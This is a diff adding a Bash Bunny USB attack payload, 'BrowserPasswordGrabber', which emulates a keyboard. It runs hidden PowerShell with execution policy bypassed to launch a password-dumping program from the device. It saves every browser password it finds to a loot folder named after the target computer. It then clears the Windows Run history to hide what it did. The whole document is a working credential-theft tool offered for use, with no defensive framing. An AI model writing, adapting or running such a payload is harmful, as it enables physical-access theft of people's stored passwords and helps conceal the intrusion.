@@ -1,0 +1,50 @@
+#BPG (BrowserPasswordGrabber)
+#Steals all browser passwords in seconds
+
+#Setup
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+#Atack fase
+LED ATTACK
+#Copy driveletter by running GetDrive.ps1
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q DELAY 800
+#Start program
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\pass.exe')"
+Q DELAY 1800
+Q CONTROL a
+Q DELAY 500
+Q CONTROL s
+Q DELAY 500
+Q STRING %computername% - Pass
+Q F4
+Q DELAY 100
+Q CONTROL a
+Q DELAY 100
+Q CONTROL v
+Q DELAY 100
+Q STRING loot
+Q DELAY 200
+Q ENTER
+Q DELAY 500
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 100
+Q ALT F4
+
+#Cleaning up
+LED CLEANUP
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+
+LED FINISH
+ATTACKMODE OFF
